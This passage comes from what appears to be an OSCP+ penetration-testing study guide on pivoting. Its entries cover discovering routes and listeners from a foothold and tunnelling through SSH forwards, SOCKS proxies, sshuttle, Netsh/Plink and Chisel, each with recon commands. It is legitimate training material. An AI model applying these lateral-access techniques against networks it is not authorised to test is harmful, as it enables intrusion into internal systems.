text: id="cleanup-and-restriction">10.8.14 Cleanup and restriction Remove temporary TUN routes/interfaces, Ligolo listeners, Chisel/Socat/SSH processes, host mappings, Netsh/firewall rules and password files. Record the exact route before cleanup. The current OSCP+ exam guide explicitly prohibits Metasploit pivoting. <h2

title: 10.8.15 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.8.15 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.8.15.1 Reach internal services
text: id="reach-internal-services">10.8.15.1 Reach internal services <summary

title: 10.8.15.1.1 Find: Discover pivot interfaces, routes and internal service context
text: id="variant-10-8-15-1-1">10.8.15.1.1 Find: Discover pivot interfaces, routes and internal service context On the foothold inspect interfaces/routes and local listeners, then test an explicitly assigned destination from that host. ip addr ip route ss -lntup Recognize: A second network or loopback listener supplies a new vantage candidate; forwarding is not automatically enabled. Validate next: Read interfaces/routes/listeners on the pivot and probe the internal destination from that host. Draw both legs and the initiator; only choose SSH/SOCKS/Ligolo after the destination leg works. Discover pivot interfaces, routes and internal service context . <summary

title: 10.8.15.1.2 Find: Relay a single TCP service through a fixed forward
text: id="variant-10-8-15-1-2">10.8.15.1.2 Find: Relay a single TCP service through a fixed forward From pivot-state evidence identify one fixed TCP destination and where the assessment client can reach a pivot listener. ip route get TARGET ss -lnt Recognize: A single TCP service can fit a fixed relay without assuming a full routed network. Validate next: Confirm both legs, bind address/permission and any additional dynamic ports or return path. Relay a single TCP service through a fixed forward . <summary

title: 10.8.15.1.3 Find: Forward a selected service through an SSH client-side listener
text: id="variant-10-8-15-1-3">10.8.15.1.3 Find: Forward a selected service through an SSH client-side listener Use accepted SSH and the SSH server's verified reachability to a selected internal/loopback service; identify where the local client needs its listener. ssh -v -p SSH_PORT USER@PIVOT ss -lnt Recognize: Client-side listener plus server-side destination is the -L direction; destination loopback belongs to the SSH server. Validate next: Verify forwarding policy, local bind and server-to-destination application access. Forward a selected service through an SSH client-side listener . <summary

title: 10.8.15.1.4 Find: Provide SOCKS access through SSH dynamic forwarding
text: id="variant-10-8-15-1-4">10.8.15.1.4 Find: Provide SOCKS access through SSH dynamic forwarding From accepted SSH and a mapped internal service set determine whether each required client can use a SOCKS TCP connection. ssh -v -p SSH_PORT USER@PIVOT Recognize: Multiple client-selected TCP destinations suggest a dynamic SOCKS listener rather than many fixed forwards. Validate next: Check SSH forwarding, listener bind, native/intercepted client support and DNS resolution location. Provide SOCKS access through SSH dynamic forwarding . <summary

title: 10.8.15.1.5 Find: Expose an SSH-client-side destination through a server-side remote listener
text: id="variant-10-8-15-1-5">10.8.15.1.5 Find: Expose an SSH-client-side destination through a server-side remote listener Identify an outbound-only pivot-to-SSH-server path and a service reached from that SSH client/pivot; decide where the remote listener is needed. ssh -v USER@SSH_SERVER Recognize: The useful listener is on the SSH server while the destination is reached from the client side: a remote forward candidate. Validate next: Verify remote-forward permission, server bind/GatewayPorts policy and pivot-side destination reachability. Expose an SSH-client-side destination through a server-side remote listener . <summary

title: 10.8.15.1.6 Find: Expose a server-side SOCKS proxy through remote dynamic SSH forwarding
text: id="variant-10-8-15-1-6">10.8.15.1.6 Find: Expose a server-side SOCKS proxy through remote dynamic SSH forwarding For an outbound-only SSH path identify the need for several client-selected destinations and inspect the actual SSH client implementation/version. ssh -V Recognize: Remote listener placement plus per-connection SOCKS destination selection suggests remote dynamic forwarding. Validate next: Check implementation support, remote-forward policy, listener binding and proxy-client/DNS compatibility. Expose a server-side SOCKS proxy through remote dynamic SSH forwarding . <summary

title: 10.8.15.1.7 Find: Use ProxyChains, native SOCKS clients and SSH jump paths appropriately
text: id="variant-10-8-15-1-7">10.8.15.1.7 Find: Use ProxyChains, native SOCKS clients and SSH jump paths appropriately Inspect the established proxy/jump topology and each intended client's actual SOCKS or SSH-jump support before a protocol test. curl --socks5-hostname 127.0.0.1:SOCKS_PORT http://TARGET:PORT/ Recognize: One supported TCP application works; the proxy does not automatically carry raw packets or arbitrary DNS/UDP. Validate next: Check native versus intercepted support, connect-only scanner modes, name resolution and every required protocol leg. Use ProxyChains, native SOCKS clients and SSH jump paths appropriately . <summary

title: 10.8.15.1.8 Find: Route a selected subnet through sshuttle
text: id="variant-10-8-15-1-8">10.8.15.1.8 Find: Route a selected subnet through sshuttle Identify several internal TCP destinations, existing SSH access and whether the local/remote privilege/runtime requirements can be met. ssh -v USER@PIVOT python3 --version ip route Recognize: An SSH carrier and compatible endpoints make a transparent selected-subnet route a candidate; local Python output alone does not prove the remote runtime. Validate next: Verify local route/firewall permissions, remote runtime, supported transport/mode and explicitly selected subnet/DNS behavior. Route a selected subnet through sshuttle . <summary

title: 10.8.15.1.9 Find: Forward from Windows with OpenSSH, Plink or Netsh
text: id="variant-10-8-15-1-9">10.8.15.1.9 Find: Forward from Windows with OpenSSH, Plink or Netsh From a Windows pivot inspect native/available tunnel utilities, its route to the destination and the rights needed by the selected implementation. Get-Command ssh,plink,netsh -ErrorAction SilentlyContinue Get-Service iphlpsvc Test-NetConnection TARGET -Port PORT Recognize: Windows has a carrier/destination candidate; Netsh administrative state and user-space SSH requirements differ. Validate next: Choose the supported tool, verify listener/bind/firewall and correct connection direction; check its exact rights. Forward from Windows with OpenSSH, Plink or Netsh . <summary

title: 10.8.15.1.10 Find: Use a reverse Chisel SOCKS or fixed TCP tunnel
